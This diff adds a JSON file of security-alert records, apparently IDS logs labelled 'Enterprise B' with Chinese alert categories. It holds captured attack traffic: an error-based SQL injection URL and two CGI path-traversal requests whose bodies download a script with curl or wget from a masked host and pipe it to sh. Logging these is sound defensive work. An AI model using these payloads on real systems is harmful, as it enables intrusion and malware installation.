@@ -1,0 +1,56 @@
+{
+  "enterprise": "Enterprise B",
+  "examples": [
+    {
+      "last_seen_time": "2025-02-21 07:52:21",
+      "victim_ip": "XXX.XXX.7.82",
+      "attacker_ip": "XXX.XXX.XXX.XXX",
+      "primary_alert_type": "攻击利用",
+      "secondary_alert_type": "SQL注入",
+      "threat_name": "SQL注入(词法语法)",
+      "attack_result": "企图",
+      "threat_severity": "高危",
+      "count": 1,
+      "attack_stage": "入侵",
+      "payload_content": null,
+      "request_header": "\"GET /admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(202072102)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b HTTP/1.1\\r\\nHost: XXX.XXX.XXX.XXX\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/XXX.XXX.XXX.XXX Safari/537.36\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\r\\nAccept-Language: zh-CN,zh;q=0.9\\r\\nReferer: http://XXX.XXX.XXX.XXX:80/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(202072102)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b\\r\\nAccept-Encoding: gzip\\r\\nX-Forwarded-For: XXX.XXX.XXX.XXX\\r\\n\\r\\n\"",
+      "request_body": null,
+      "response_header": "\"HTTP/1.1 302 \\r\\nLocation: /login?msg=1\\r\\nContent-Length: 0\\r\\nDate: Thu, 20 Feb 2025 23:52:21 GMT\\r\\n\\r\\n\"",
+      "response_body": null
+    },
+    {
+      "last_seen_time": "2025-02-26 10:37:24",
+      "victim_ip": "XXX.XXX.0.109",
+      "attacker_ip": "XXX.XXX.XXX.XXX",
+      "primary_alert_type": "攻击利用",
+      "secondary_alert_type": "命令执行",
+      "threat_name": "通用命令执行漏洞",
+      "attack_result": "失败",
+      "threat_severity": "危急",
+      "count": 1,
+      "attack_stage": "入侵",
+      "payload_content": null,
+      "request_header": "\"POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\\r\\nHost: XXX.XXX.XXX.XXX:443\\r\\nAccept: */*\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Custom-AsyncHttpClient\\r\\nConnection: keep-alive\\r\\nContent-Type: text/plain\\r\\nContent-Length: 105\\r\\nX-Forwarded-For: XXX.XXX.XXX.XXX\\r\\n\\r\\n\"",
+      "request_body": "\"X=$(curl http://XXX.XXX.XXX.XXX/sh || wget http://XXX.XXX.XXX.XXX/sh -O-); echo \\\"$X\\\" | sh -s apache.selfrep\"",
+      "response_header": "\"HTTP/1.1 400 Bad Request\\r\\nDate: Wed, 26 Feb 2025 02:37:24 GMT\\r\\nContent-Type: text/html; charset=utf-8\\r\\nContent-Length: 173\\r\\nConnection: close\\r\\nServer: static-server\\r\\n\\r\\n\"",
+      "response_body": "\"<html>\\r\\n<head><title>400 Bad Request</title></head>\\r\\n<body bgcolor=\\\"white\\\">\\r\\n<center><h1>400 Bad Request</h1></center>\\r\\n<hr><center>nginx/1.14.0</center>\\r\\n</body>\\r\\n</html>\\r\\n\""
+    },
+    {
+      "last_seen_time": "2025-02-28 23:57:07",
+      "victim_ip": "XXX.XXX.30.68",
+      "attacker_ip": "XXX.XXX.XXX.XXX",
+      "primary_alert_type": "攻击利用",
+      "secondary_alert_type": "目录遍历",
+      "threat_name": "发现目录穿越攻击行为",
+      "attack_result": "失败",
+      "threat_severity": "高危",
+      "count": 2,
+      "attack_stage": "入侵",
+      "payload_content": null,
+      "request_header": "\"POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\\r\\nHost: XXX.XXX.XXX.XXX:443\\r\\nAccept: */*\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Custom-AsyncHttpClient\\r\\nConnection: keep-alive\\r\\nContent-Type: text/plain\\r\\nContent-Length: 105\\r\\nX-Forwarded-For: XXX.XXX.XXX.XXX\\r\\n\\r\\n\"",
+      "request_body": "\"X=$(curl http://XXX.XXX.XXX.XXX/sh || wget http://XXX.XXX.XXX.XXX/sh -O-); echo \\\"$X\\\" | sh -s apache.selfrep\"",
+      "response_header": "\"HTTP/1.1 400 Bad Request\\r\\nDate: Fri, 28 Feb 2025 15:57:08 GMT\\r\\nContent-Type: text/html\\r\\nContent-Length: 204\\r\\nConnection: close\\r\\n\\r\\n\"",
+      "response_body": "\"<!DOCTYPE HTML PUBLIC \\\"-//IETF//DTD HTML 2.0//EN\\\">\\r\\n<html>\\r\\n<head><title>400 Bad Request</title></head>\\r\\n<body>\\r\\n<center><h1>400 Bad Request</h1></center>\\r\\n<hr><center>tengine</center>\\r\\n</body>\\r\\n</html>\\r\\n\""
+    }
+  ]
+}
